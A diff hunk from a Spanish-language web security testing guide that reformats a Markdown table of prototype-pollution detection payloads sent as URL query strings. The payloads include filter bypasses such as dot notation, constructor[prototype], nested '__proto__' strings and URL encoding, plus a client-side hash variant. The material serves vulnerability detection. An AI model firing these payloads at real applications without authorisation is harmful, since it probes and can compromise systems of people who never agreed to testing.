@@ -474,14 +474,14 @@ El objetivo aquí no es explotar, sino comprobar si el entorno es vulnerable mod
 
 Utilizado cuando el backend parsea la URL con librerías vulnerables (ej. `qs` antiguo) o el frontend lee la URL (CSPP).
 
-|**Payload**|**Técnica / Variante**|
-|---|---|
-|`?__proto__[test]=polluted`|Clásica inyección por corchetes.|
-|`?__proto__.test=polluted`|Notación de puntos (evade filtros de corchetes).|
-|`?constructor[prototype][test]=polluted`|Bypass de filtro de palabra `__proto__`.|
-|`?__pro__proto__to__[test]=polluted`|Bypass de sanitización no recursiva (reemplazo simple).|
-|`?%5f%5fproto%5f%5f[test]=polluted`|URL Encoding de los guiones bajos.|
-|`#x[__proto__][test]=polluted`|Inyección en el fragmento (Hash) para Client-Side.|
+| **Payload**                              | **Técnica / Variante**                                  |
+| ---------------------------------------- | ------------------------------------------------------- |
+| `?__proto__[test]=polluted`              | Clásica inyección por corchetes.                        |
+| `?__proto__.test=polluted`               | Notación de puntos (evade filtros de corchetes).        |
+| `?constructor[prototype][test]=polluted` | Bypass de filtro de palabra `__proto__`.                |
+| `?__pro__proto__to__[test]=polluted`     | Bypass de sanitización no recursiva (reemplazo simple). |
+| `?%5f%5fproto%5f%5f[test]=polluted`      | URL Encoding de los guiones bajos.                      |
+| `#x[__proto__][test]=polluted`           | Inyección en el fragmento (Hash) para Client-Side.      |
 
 ### 1.2 Detección Vía JSON (Cuerpos de Petición / API REST)
 
